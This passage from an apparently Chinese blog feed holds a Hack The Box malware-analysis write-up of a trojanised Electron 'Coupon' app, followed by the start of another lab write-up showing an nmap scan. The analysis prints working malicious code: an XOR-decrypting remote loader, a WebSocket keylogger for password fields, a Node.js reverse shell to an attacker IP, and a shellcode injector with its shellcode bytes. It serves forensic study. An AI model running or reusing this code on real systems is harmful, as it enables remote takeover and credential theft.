class="keyword">var</span> str = <span class="title class_">Buffer</span>.<span class="title function_">from</span>(b64string, <span class="string">&#x27;base64&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> keyBuf = <span class="title class_">Buffer</span>.<span class="title function_">from</span>(body, <span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line"><span class="keyword">let</span> strBuf = <span class="title class_">Buffer</span>.<span class="title function_">from</span>(str, <span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line"><span class="keyword">let</span> outBuf = <span class="title class_">Buffer</span>.<span class="title function_">alloc</span>(strBuf.<span class="property">length</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> n = <span class="number">0</span>; n &lt; strBuf.<span class="property">length</span>; n++)</span><br><span class="line">outBuf[n] = strBuf[n] ^ keyBuf[n % keyBuf.<span class="property">length</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">//console.log(outBuf.toString())</span></span><br><span class="line"><span class="keyword">var</span> code = outBuf.<span class="title function_">toString</span>()</span><br><span class="line"><span class="keyword">var</span> script = <span class="keyword">new</span> vm.<span class="title class_">Script</span>(code);</span><br><span class="line"><span class="keyword">var</span> context = vm.<span class="title function_">createContext</span>(&#123; <span class="attr">require</span>: <span class="built_in">require</span> &#125;);</span><br><span class="line"></span><br><span class="line">script.<span class="title function_">runInNewContext</span>(context);</span><br><span class="line"></span><br><span class="line">  &#125;);</span><br><span class="line">&#125;).<span class="title function_">on</span>(<span class="string">&#x27;error&#x27;</span>, <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Got error: &quot;</span> + e.<span class="property">message</span>);</span><br><span class="line">&#125;);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>简单分析可知预加载脚本的作用是<strong>从远程服务器获取异或密钥，解密一个 Base64 编码的字符串，并执行解密后的 JavaScript 代码</strong></p><p>在public目录下存放了攻击者用来进行钓鱼的页面</p><p><img src="/2025/03/08/OpSalwarKameez24-1/微信截图_20250308162026.png" alt="微信截图_20250308162026"></p><p>但是这里的账户和密码在输入之后的处理程序却是一个<code>keylogger</code>，具体代码如下</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typeof</span> <span class="built_in">require</span> === <span class="string">&#x27;undefined&#x27;</span>;</span><br><span class="line"><span class="title function_">runShell</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="string">&quot;WebSocket&quot;</span> <span class="keyword">in</span> <span class="variable language_">window</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">var</span> socket = <span class="keyword">new</span> <span class="title class_">WebSocket</span>(<span class="string">&quot;ws://0.0.0.0:44500&quot;</span>);</span><br><span class="line">  <span class="keyword">var</span> all_input_fields = <span class="variable language_">document</span>.<span class="title function_">getElementsByTagName</span>(<span class="string">&quot;input&quot;</span>);</span><br><span class="line">  <span class="keyword">var</span> page_url = <span class="variable language_">document</span>.<span class="property">baseURI</span>;</span><br><span class="line">  <span class="keyword">var</span> now = <span class="title class_">Date</span>();</span><br><span class="line"></span><br><span class="line">  socket.<span class="property">onopen</span> = <span class="keyword">function</span>(<span class="params"></span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> (all_input_fields.<span class="property">length</span> &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      socket.<span class="title function_">send</span>(<span class="string">&quot;\n\n --------------- &quot;</span> + now + <span class="string">&quot; --------------- &quot;</span>);</span><br><span class="line">      socket.<span class="title function_">send</span>(<span class="string">&quot;\nURL: &quot;</span> + page_url + <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">      <span class="keyword">var</span> all = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; all_input_fields.<span class="property">length</span>; i++)</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ((all_input_fields[i].<span class="property">type</span>.<span class="title function_">toLowerCase</span>() == <span class="string">&quot;text&quot;</span>) || (all_input_fields[i].<span class="property">type</span>.<span class="title function_">toLowerCase</span>() == <span class="string">&quot;password&quot;</span>))</span><br><span class="line">        &#123;</span><br><span class="line">          all_input_fields[i].<span class="property">onfocus</span> = <span class="keyword">function</span>(<span class="params"></span>)</span><br><span class="line">          &#123;</span><br><span class="line">            socket.<span class="title function_">send</span>(<span class="string">&quot;\n##########\n&quot;</span> + <span class="variable language_">this</span>.<span class="property">name</span> + <span class="string">&quot; --&gt; &quot;</span>);</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          all_input_fields[i].<span class="property">onkeydown</span> = <span class="keyword">function</span>(<span class="params">sniffed_key</span>)</span><br><span class="line">          &#123;</span><br><span class="line">            socket.<span class="title function_">send</span>(sniffed_key.<span class="property">keyCode</span>);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  socket.<span class="property">onbeforeunload</span> = <span class="keyword">function</span>(<span class="params"></span>)</span><br><span class="line">  &#123;</span><br><span class="line">    socket.<span class="title function_">close</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>监听网页上的文本输入框和密码输入框的按键输入，并通过 WebSocket 将按键数据发送到远程服务器</strong>（<code>ws://0.0.0.0:44500</code>），实现键盘记录</p><p>接下来打开流量包，我们寻找一下异或的密钥，这里因为密钥传输使用的是HTTP协议，我们过滤一下HTTP流量，在GET请求的返回包中我们找到密钥<code>ec1ee034ec1ee034</code></p><p><img src="/2025/03/08/OpSalwarKameez24-1/微信截图_20250308163929.png" alt="微信截图_20250308163929"></p><p>我们利用cyberchef解密一下shellcode</p><p><img src="/2025/03/08/OpSalwarKameez24-1/微信截图_20250308164207.png" alt="微信截图_20250308164207"></p><p>完整的shellcode如下，实际上就是一个Node.js的反弹shell，我们可以简单的提取出攻击者服务器IP和开放端口</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> net = <span class="built_in">require</span>(<span class="string">&quot;net&quot;</span>),</span><br><span class="line">        cp = <span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>),</span><br><span class="line">        sh = cp.<span class="title function_">spawn</span>(<span class="string">&quot;cmd.exe&quot;</span>, []);</span><br><span class="line">    <span class="keyword">var</span> client = <span class="keyword">new</span> net.<span class="title class_">Socket</span>();</span><br><span class="line">    client.<span class="title function_">connect</span>(<span class="number">4444</span>, <span class="string">&quot;15.206.13.31&quot;</span>, <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        client.<span class="title function_">pipe</span>(sh.<span class="property">stdin</span>);</span><br><span class="line">        sh.<span class="property">stdout</span>.<span class="title function_">pipe</span>(client);</span><br><span class="line">        sh.<span class="property">stderr</span>.<span class="title function_">pipe</span>(client);</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">return</span> <span class="regexp">/a/</span>; <span class="comment">// Prevents the Node.js application form crashing</span></span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><p>在获取的流量包中追踪TCP流，查找攻击者执行的命令</p><p><img src="/2025/03/08/OpSalwarKameez24-1/微信截图_20250308164928.png" alt="微信截图_20250308164928"></p><p>恶意代码在Nodejs的vm模块下的runInNewContext函数中执行</p><p><img src="/2025/03/08/OpSalwarKameez24-1/微信截图_20250308165401.png" alt="微信截图_20250308165401"></p><p>我们尝试反编译一下public目录下的字节码文件<code>script.jsc</code>，我们将利用<a href="https://github.com/suleram/View8">view8</a></p><blockquote><p><strong>JSC 文件</strong> 是JavaScript 编译文件，通常是 JavaScript 代码的 字节码版本。这些文件可以由 JavaScript 引擎（如 V8、JavaScriptCore）生成，用于提升代码执行效率，或者保护源代码免遭直接查看。</p></blockquote><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python view8.py C:\Users\lenovo\Desktop\Electron<span class="literal">-Coupon</span>\resources\unpacked\extraResources\script.jsc script.txt</span><br></pre></td></tr></table></figure><p>反编译之后的代码如下</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">func_unknown</span>(<span class="params"></span>)</span><br><span class="line">&#123;</span><br><span class="line">r0 = func_unknown_0000035410FDD9D1</span><br><span class="line"><span class="keyword">return</span> func_unknown_0000035410FDD9D1</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">func_unknown_0000035410FDD9D1</span>(<span class="params">a0, a1, a2, a3, a4</span>)</span><br><span class="line">&#123;</span><br><span class="line">r0 = <span class="title function_">a1</span>(<span class="string">&quot;ffi-napi&quot;</span>)</span><br><span class="line">r1 = <span class="title function_">a1</span>(<span class="string">&quot;ref-napi&quot;</span>)</span><br><span class="line">r15 = <span class="keyword">new</span> [<span class="number">252</span>, <span class="number">72</span>, <span class="number">129</span>, <span class="number">228</span>, <span class="number">240</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">232</span>, <span class="number">208</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">81</span>, <span class="number">65</span>, <span class="number">80</span>, <span class="number">82</span>, <span class="number">81</span>, <span class="number">86</span>, <span class="number">72</span>, <span class="number">49</span>, <span class="number">210</span>, <span class="number">101</span>, <span class="number">72</span>, <span class="number">139</span>, <span class="number">82</span>, <span class="number">96</span>, <span class="number">62</span>, <span class="number">72</span>, <span class="number">139</span>, <span class="number">82</span>, <span class="number">24</span>, <span class="number">62</span>, <span class="number">72</span>, <span class="number">139</span>, <span class="number">82</span>, <span class="number">32</span>, <span class="number">62</span>, <span class="number">72</span>, <span class="number">139</span>, <span class="number">114</span>, <span class="number">80</span>, <span class="number">62</span>, <span class="number">72</span>, <span class="number">15</span>, <span class="number">183</span>, <span class="number">74</span>, <span class="number">74</span>, <span class="number">77</span>, <span class="number">49</span>, <span class="number">201</span>, <span class="number">72</span>, <span class="number">49</span>, <span class="number">192</span>, <span class="number">172</span>, <span class="number">60</span>, <span class="number">97</span>, <span class="number">124</span>, <span class="number">2</span>, <span class="number">44</span>, <span class="number">32</span>, <span class="number">65</span>, <span class="number">193</span>, <span class="number">201</span>, <span class="number">13</span>, <span class="number">65</span>, <span class="number">1</span>, <span class="number">193</span>, <span class="number">226</span>, <span class="number">237</span>, <span class="number">82</span>, <span class="number">65</span>, <span class="number">81</span>, <span class="number">62</span>, <span class="number">72</span>, <span class="number">139</span>, <span class="number">82</span>, <span class="number">32</span>, <span class="number">62</span>, <span class="number">139</span>, <span class="number">66</span>, <span class="number">60</span>, <span class="number">72</span>, <span class="number">1</span>, <span class="number">208</span>, <span class="number">62</span>, <span class="number">139</span>, <span class="number">128</span>, <span class="number">136</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">72</span>, <span class="number">133</span>, <span class="number">192</span>, <span class="number">116</span>, <span class="number">111</span>, <span class="number">72</span>, <span class="number">1</span>, <span class="number">208</span>, <span class="number">80</span>, <span class="number">62</span>, <span class="number">139</span>, <span class="number">72</span>, <span class="number">24</span>, <span class="number">62</span>, <span class="number">68</span>, <span class="number">139</span>, <span class="number">64</span>, <span class="number">32</span>, <span class="number">73</span>, <span class="number">1</span>, <span class="number">208</span>, <span class="number">227</span>, <span class="number">92</span>, <span class="number">72</span>, <span class="number">255</span>, <span class="number">201</span>, <span class="number">62</span>, <span class="number">65</span>, <span class="number">139</span>, <span class="number">52</span>, <span class="number">136</span>, <span class="number">72</span>, <span class="number">1</span>, <span class="number">214</span>, <span class="number">77</span>, <span class="number">49</span>, <span class="number">201</span>, <span class="number">72</span>, <span class="number">49</span>, <span class="number">192</span>, <span class="number">172</span>, <span class="number">65</span>, <span class="number">193</span>, <span class="number">201</span>, <span class="number">13</span>, <span class="number">65</span>, <span class="number">1</span>, <span class="number">193</span>, <span class="number">56</span>, <span class="number">224</span>, <span class="number">117</span>, <span class="number">241</span>, <span class="number">62</span>, <span class="number">76</span>, <span class="number">3</span>, <span class="number">76</span>, <span class="number">36</span>, <span class="number">8</span>, <span class="number">69</span>, <span class="number">57</span>, <span class="number">209</span>, <span class="number">117</span>, <span class="number">214</span>, <span class="number">88</span>, <span class="number">62</span>, <span class="number">68</span>, <span class="number">139</span>, <span class="number">64</span>, <span class="number">36</span>, <span class="number">73</span>, <span class="number">1</span>, <span class="number">208</span>, <span class="number">102</span>, <span class="number">62</span>, <span class="number">65</span>, <span class="number">139</span>, <span class="number">12</span>, <span class="number">72</span>, <span class="number">62</span>, <span class="number">68</span>, <span class="number">139</span>, <span class="number">64</span>, <span class="number">28</span>, <span class="number">73</span>, <span class="number">1</span>, <span class="number">208</span>, <span class="number">62</span>, <span class="number">65</span>, <span class="number">139</span>, <span class="number">4</span>, <span class="number">136</span>, <span class="number">72</span>, <span class="number">1</span>, <span class="number">208</span>, <span class="number">65</span>, <span class="number">88</span>, <span class="number">65</span>, <span class="number">88</span>, <span class="number">94</span>, <span class="number">89</span>, <span class="number">90</span>, <span class="number">65</span>, <span class="number">88</span>, <span class="number">65</span>, <span class="number">89</span>, <span class="number">65</span>, <span class="number">90</span>, <span class="number">72</span>, <span class="number">131</span>, <span class="number">236</span>, <span class="number">32</span>, <span class="number">65</span>, <span class="number">82</span>, <span class="number">255</span>, <span class="number">224</span>, <span class="number">88</span>, <span class="number">65</span>, <span class="number">89</span>, <span class="number">90</span>, <span class="number">62</span>, <span class="number">72</span>, <span class="number">139</span>, <span class="number">18</span>, <span class="number">233</span>, <span class="number">73</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">93</span>, <span class="number">62</span>, <span class="number">72</span>, <span class="number">141</span>, <span class="number">141</span>, <span class="number">32</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">186</span>, <span class="number">76</span>, <span class="number">119</span>, <span class="number">38</span>, <span class="number">7</span>, <span class="number">255</span>, <span class="number">213</span>, <span class="number">73</span>, <span class="number">199</span>, <span class="number">193</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">62</span>, <span class="number">72</span>, <span class="number">141</span>, <span class="number">149</span>, <span class="number">14</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">62</span>, <span class="number">76</span>, <span class="number">141</span>, <span class="number">133</span>, <span class="number">25</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">72</span>, <span class="number">49</span>, <span class="number">201</span>, <span class="number">65</span>, <span class="number">186</span>, <span class="number">69</span>, <span class="number">131</span>, <span class="number">86</span>, <span class="number">7</span>, <span class="number">255</span>, <span class="number">213</span>, <span class="number">72</span>, <span class="number">49</span>, <span class="number">201</span>, <span class="number">65</span>, <span class="number">186</span>, <span class="number">240</span>, <span class="number">181</span>, <span class="number">162</span>, <span class="number">86</span>, <span class="number">255</span>, <span class="number">213</span>, <span class="number">67</span>, <span class="number">79</span>, <span class="number">85</span>, <span class="number">80</span>, <span class="number">79</span>, <span class="number">78</span>, <span class="number">49</span>, <span class="number">51</span>, <span class="number">51</span>, <span class="number">55</span>, <span class="number">0</span>, <span class="number">80</span>, <span class="number">65</span>, <span class="number">87</span>, <span class="number">78</span>, <span class="number">69</span>, <span class="number">68</span>, <span class="number">0</span>, <span class="number">117</span>, <span class="number">115</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">51</span>, <span class="number">50</span>, <span class="number">46</span>, <span class="number">100</span>, <span class="number">108</span>, <span class="number">108</span>, <span class="number">0</span>]</span><br><span class="line">r2 = <span class="string">&quot;Buffer&quot;</span>[<span class="string">&quot;from&quot;</span>](r15)</span><br><span class="line">r6 = r1[<span class="string">&quot;refType&quot;</span>](r1[<span class="string">&quot;types&quot;</span>][<span class="string">&quot;void&quot;</span>])</span><br><span class="line">r7 = r1[<span class="string">&quot;refType&quot;</span>](r1[<span class="string">&quot;types&quot;</span>][<span class="string">&quot;void&quot;</span>])</span><br><span class="line">r8 = r1[<span class="string">&quot;refType&quot;</span>](r1[<span class="string">&quot;types&quot;</span>][<span class="string">&quot;uint32&quot;</span>])</span><br><span class="line">r15 = <span class="keyword">new</span> &#123;<span class="string">&quot;VirtualAlloc&quot;</span>: <span class="literal">null</span>, <span class="string">&quot;RtlMoveMemory&quot;</span>: <span class="literal">null</span>, <span class="string">&quot;CreateThread&quot;</span>: <span class="literal">null</span>, <span class="string">&quot;WaitForSingleObject&quot;</span>: <span class="literal">null</span>&#125;</span><br><span class="line">r17 = <span class="keyword">new</span> [<span class="number">0</span>, <span class="number">0</span>]</span><br><span class="line">r17[<span class="number">0</span>] = r7</span><br><span class="line">r19 = <span class="keyword">new</span> [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>]</span><br><span class="line">r19[<span class="number">0</span>] = r7</span><br><span class="line">r19[<span class="number">1</span>] = r1[<span class="string">&quot;types&quot;</span>][<span class="string">&quot;uint64&quot;</span>]</span><br><span class="line">r19[<span class="number">2</span>] = r1[<span class="string">&quot;types&quot;</span>][<span class="string">&quot;uint32&quot;</span>]</span><br><span class="line">r19[<span class="number">3</span>] = r1[<span class="string">&quot;types&quot;</span>][<span class="string">&quot;uint32&quot;</span>]</span><br><span class="line">r17[<span class="number">1</span>] = r19</span><br><span class="line">r15[<span class="string">&quot;VirtualAlloc&quot;</span>] = r17</span><br><span class="line">r17 = <span class="keyword">new</span> [<span class="number">0</span>, <span class="number">0</span>]</span><br><span class="line">r17[<span class="number">0</span>] = r1[<span class="string">&quot;types&quot;</span>][<span class="string">&quot;void&quot;</span>]</span><br><span class="line">r19 = <span class="keyword">new</span> [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>]</span><br><span class="line">r19[<span class="number">0</span>] = r7</span><br><span class="line">r19[<span class="number">1</span>] = r7</span><br><span class="line">r19[<span class="number">2</span>] = r1[<span class="string">&quot;types&quot;</span>][<span class="string">&quot;uint64&quot;</span>]</span><br><span class="line">r17[<span class="number">1</span>] = r19</span><br><span class="line">r15[<span class="string">&quot;RtlMoveMemory&quot;</span>] = r17</span><br><span class="line">r17 = <span class="keyword">new</span> [<span class="number">0</span>, <span class="number">0</span>]</span><br><span class="line">r17[<span class="number">0</span>] = r6</span><br><span class="line">r19 = <span class="keyword">new</span> [<span class="string">&quot;pointer&quot;</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>]</span><br><span class="line">r19[<span class="number">1</span>] = r1[<span class="string">&quot;types&quot;</span>][<span class="string">&quot;uint64&quot;</span>]</span><br><span class="line">r19[<span class="number">2</span>] = r7</span><br><span class="line">r19[<span class="number">3</span>] = r7</span><br><span class="line">r19[<span class="number">4</span>] = r1[<span class="string">&quot;types&quot;</span>][<span class="string">&quot;uint32&quot;</span>]</span><br><span class="line">r19[<span class="number">5</span>] = r8</span><br><span class="line">r17[<span class="number">1</span>] = r19</span><br><span class="line">r15[<span class="string">&quot;CreateThread&quot;</span>] = r17</span><br><span class="line">r17 = <span class="keyword">new</span> [<span class="number">0</span>, <span class="number">0</span>]</span><br><span class="line">r17[<span class="number">0</span>] = r1[<span class="string">&quot;types&quot;</span>][<span class="string">&quot;uint32&quot;</span>]</span><br><span class="line">r19 = <span class="keyword">new</span> [<span class="number">0</span>, <span class="number">0</span>]</span><br><span class="line">r19[<span class="number">0</span>] = r6</span><br><span class="line">r19[<span class="number">1</span>] = r1[<span class="string">&quot;types&quot;</span>][<span class="string">&quot;uint32&quot;</span>]</span><br><span class="line">r17[<span class="number">1</span>] = r19</span><br><span class="line">r15[<span class="string">&quot;WaitForSingleObject&quot;</span>] = r17</span><br><span class="line"><span class="variable constant_">ACCU</span> = r0[<span class="string">&quot;Library&quot;</span>]</span><br><span class="line">r9 = r0[<span class="string">&quot;Library&quot;</span>](<span class="string">&quot;kernel32&quot;</span>, r15)</span><br><span class="line"><span class="variable constant_">ACCU</span> = <span class="string">&quot;console&quot;</span>[<span class="string">&quot;log&quot;</span>](<span class="string">&quot;shellcode length:&quot;</span>, r2[<span class="string">&quot;length&quot;</span>])</span><br><span class="line">r14 = r9</span><br><span class="line">r10 = r9[<span class="string">&quot;VirtualAlloc&quot;</span>](<span class="literal">null</span>, r2[<span class="string">&quot;length&quot;</span>], <span class="number">12288</span>, <span class="number">64</span>)</span><br><span class="line"><span class="variable constant_">ACCU</span> = <span class="string">&quot;console&quot;</span>[<span class="string">&quot;log&quot;</span>](r10)</span><br><span class="line">r14 = r9</span><br><span class="line">r15 = r10</span><br><span class="line">r16 = r2</span><br><span class="line"><span class="variable constant_">ACCU</span> = r9[<span class="string">&quot;RtlMoveMemory&quot;</span>](r15, r16, r2[<span class="string">&quot;length&quot;</span>])</span><br><span class="line">r15 = r1[<span class="string">&quot;refType&quot;</span>](r1[<span class="string">&quot;types&quot;</span>][<span class="string">&quot;uint32&quot;</span>])</span><br><span class="line">r11 = r1[<span class="string">&quot;alloc&quot;</span>](r15)</span><br><span class="line">r14 = r9</span><br><span class="line">r17 = r10</span><br><span class="line">r20 = r11</span><br><span class="line">r12 = r9[<span class="string">&quot;CreateThread&quot;</span>](<span class="literal">null</span>, <span class="number">0</span>, r17, <span class="literal">null</span>, <span class="number">0</span>, r20)</span><br><span class="line">r16 = r11[<span class="string">&quot;readUint32LE&quot;</span>]()</span><br><span class="line"><span class="variable constant_">ACCU</span> = <span class="string">&quot;console&quot;</span>[<span class="string">&quot;log&quot;</span>](<span class="string">&quot;thread id:&quot;</span>, r16)</span><br><span class="line"><span class="variable constant_">ACCU</span> = r9[<span class="string">&quot;WaitForSingleObject&quot;</span>](r12, <span class="number">4294967295.0</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">undefined</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>这段代码是反编译的 JavaScript 代码，主要利用 <code>ffi-napi</code> 和 <code>ref-napi</code> 进行Windows API 调用，最终实现了动态分配内存、写入 shellcode 并执行。</p><p><code>ffi-napi</code>：用于调用Windows API函数。</p><p><code>ref-napi</code>：用于创建C 语言类型，帮助与 Windows API 交互。</p></blockquote><p>很容易猜测我们的shellcode就在<code>r15</code>这个数组中，我们将机器码转换为ASCII码</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">üHäðÿÿÿèÐAQAPRQVH1ÒeHR`&gt;HR&gt;HR &gt;HrP&gt;H·JJM1ÉH1À¬<span class="language-xml">&lt;a|, AÁÉ</span></span><br><span class="line"><span class="language-xml">AÁâíRAQ&gt;</span>HR &gt;B<span class="language-xml">&lt;HÐ&gt;</span>HÀtoHÐP&gt;H&gt;D@ IÐã\HÿÉ&gt;A4HÖM1ÉH1À¬AÁÉ</span><br><span class="line">AÁ8àuñ&gt;LL$E9ÑuÖX&gt;D@$IÐf&gt;AH&gt;D@IÐ&gt;AHÐAXAX^YZAXAYAZHì ARÿàXAYZ&gt;HéIÿÿÿ]&gt;H AºLw&amp;ÿÕIÇÁ&gt;H&gt;LH1ÉAºEVÿÕH1ÉAºðµ¢VÿÕCOUPON1337PAWNEDuser32.dll</span><br></pre></td></tr></table></figure><p>从中可以看到COUPON1337和user32.dll等有意义字符串</p><h2 id="Task-Answer"><a href="#Task-Answer" class="headerlink" title="Task Answer"></a>Task Answer</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Coupon.exe</span><br><span class="line"></span><br><span class="line">nodeintegration</span><br><span class="line"></span><br><span class="line">websocket, 44500</span><br><span class="line"></span><br><span class="line">ec1ee034ec1ee034</span><br><span class="line"></span><br><span class="line">15.206.13.31, 4444, cmd.exe</span><br><span class="line"></span><br><span class="line">whoami, ipconfig</span><br><span class="line"></span><br><span class="line">vm, runInNewContext</span><br><span class="line"></span><br><span class="line">CreateThread</span><br><span class="line"></span><br><span class="line">COUPON1337</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> HTB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Malware Analysis </tag>
            
            <tag> Traffic Analysis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTB-Rebound</title>
      <link href="/2025/03/02/HTB-Rebound/"/>
      <url>/2025/03/02/HTB-Rebound/</url>
      
        <content type="html"><![CDATA[<p><img src="/2025/03/02/HTB-Rebound/Rebound.png" alt="Rebound"></p><h2 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h2><p>nmap进行端口扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sT --min-rate 1000 -p- 10.10.11.231 -oA nmapscan/ports</span><br><span class="line"></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.11.231</span><br><span class="line">Host is up (0.11s latency).</span><br><span class="line">Not shown: 60752 closed tcp ports (conn-refused), 4758 filtered tcp ports (no-response)</span><br><span class="line">PORT      STATE SERVICE</span><br><span class="line">53/tcp    open  domain</span><br><span class="line">88/tcp    open  kerberos-sec</span><br><span class="line">135/tcp   open  msrpc</span><br><span class="line">139/tcp   open  netbios-ssn</span><br><span class="line">389/tcp   